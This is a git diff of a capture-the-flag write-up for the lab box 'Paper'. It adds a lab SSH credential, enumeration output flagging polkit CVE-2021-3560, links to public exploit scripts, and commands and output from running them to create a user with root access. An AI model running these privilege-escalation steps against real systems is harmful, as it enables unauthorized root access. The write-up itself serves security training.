@@ -1,4 +1,4 @@
-# Box: Paper
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/782cf5ff-68ce-47eb-b1ac-c3875bc68933)# Box: Paper
 # Level: Easy
 <hr>
 
@@ -238,7 +238,7 @@ Cool, we can use the ```file``` command to read files. We can try this for the `
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/64531f4c-3c3d-4bd9-8277-2a991cd927af)
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/68b20f80-e251-4936-a5a9-2a4e61c98fbd)
 
-It worked hehe😎
+It worked hehe😎. Ladies and Gentlemen, this is what we call directory transversal😅
 
 Well, I found an intersting file in user ```Dwight``` home directory
 
@@ -255,6 +255,8 @@ Well that password  works well for user ```dwight```😂
 
 What we can do now is ssh into the server as user ```dwight```
 
+username:```dwight```          password:```Queenofblad3s!23```
+
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9ab83300-fd39-4723-8b84-bcb282424cc2)
 
 We are in hehe. Lets go ahead and escalate our privileges
@@ -263,14 +265,82 @@ We are in hehe. Lets go ahead and escalate our privileges
 
 # Privilege Escalation
 
+Well, after looking around for a while, I found out that the host is vulnerable to a polkit exploit ```CVE-2021-3560```. 
 
+```
+                              ╔════════════════════╗                                                                                                                                            
+══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                              
+                              ╚════════════════════╝                                                                                                                                            
+╔══════════╣ Operative system                                                                                                                                                                   
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                              
+Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021                         
+lsb_release Not Found                                                                                                                                                                           
+                                                                                                                                                                                                
+╔══════════╣ Sudo version                                                                                                                                                                       
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                 
+Sudo version 1.8.29                                                                                                                                                                             
+                                                                                                                                                                                                
+╔══════════╣ CVEs Check                                                                                                                                                                         
+Vulnerable to CVE-2021-3560  
+```
 
+You can find the script [here](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)
 
+Sending it over to the target machine
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d66d024b-c314-4ae4-adaf-f192efb48a09)
 
+Lets check the content of the file we just sent
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5de52a82-7d00-4064-8d47-1deed6acbce0)
 
+That's a very long script😂
 
+We can make file an executable by using the command ```chmod +x poc.sh``` then we run the file with the command ```./poc.sh```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/de43e9f5-48c1-4e1a-9271-41cee193a3ef)
+
+Checking the usage again,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9a6c038e-f5a2-4c33-8613-a7112ea3d898)
+
+So we have the password for the user ```secnigma``` that will be created
+
+Running the shell script,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/058f6f6b-c3aa-4955-b50a-9702e97096fa)
+
+It worked
+
+Now, lets switch user ```su - secnigma```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/64cda6a0-bcd8-4d52-afa2-070dbc763bd5)
+
+Well, this wasn't working as intended. So I went ahead to look for another exploit, I actually found a python exploit, you can get it [here](https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py)
+
+Sending it over to the target's machine,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8e377a35-ba6a-4ebb-a82a-3494bfc04a7a)
+
+Running the python file,
+
+```
+[dwight@paper tmp]$ python3 CVE-2021-3560.py                                                                                                                                                    
+**************                                                                                                                                                                                  
+Exploit: Privilege escalation with polkit - CVE-2021-3560                                                                                                                                       
+Exploit code written by Ahmad Almorabea @almorabea                                                                                                                                              
+Original exploit author: Kevin Backhouse                                                                                                                                                        
+For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/                                                                             
+**************                                                                                                                                                                                  
+[+] Starting the Exploit                                                                                                                                                                        
+id: ‘ahmed’: no such user                                                                                                                                                                       
+id: ‘ahmed’: no such user                                                                                                                                                                       
+id: ‘ahmed’: no such user                                                                                                                                                                       
+id: ‘ahmed’: no such user                                                                                                                            
+[+] User Created with the name of ahmed
+
+[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root
+```
 
 
 
